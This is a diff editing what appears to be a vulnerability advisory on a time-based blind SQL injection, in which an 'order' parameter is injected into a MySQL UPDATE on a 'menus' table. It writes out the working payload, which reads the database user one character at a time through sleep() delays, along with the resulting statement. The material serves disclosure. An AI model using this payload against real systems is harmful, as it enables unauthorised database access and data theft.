@@ -19,15 +19,15 @@ mysql> select * from menus;
 2 rows in set (0.00 sec)
 ```
 
-This is the SQL injection payload:
+This is the SQL injection payload which will lead to a 3 seconds delay when the correct character is found:
 
 ```
 order[0][order`=1 and (select * from (select(if(ascii(substr((select user()),1,1))=114,sleep(3),0)))a) and `name]
 ```
 
-This is the logic of SQL UPDATE statement after the payload injected:
+This is the SQL UPDATE statement after the payload injected, if the first character of DB user is 'r' then the server response will be delayed by 3 seconds:
 ```
-UPDATE `menus` SET `id`='1' and (select * from (select(if(ascii(substr((select user()),1,1))=114,sleep(10),0)))a) and `name` = '1', WHERE `id` = '0' LIMIT 1;
+UPDATE `menus` SET `id`='1' and (select * from (select(if(ascii(substr((select user()),1,1))=114,sleep(3),0)))a) and `name` = '1', WHERE `id` = '0' LIMIT 1;
 ```
 
 # Reference
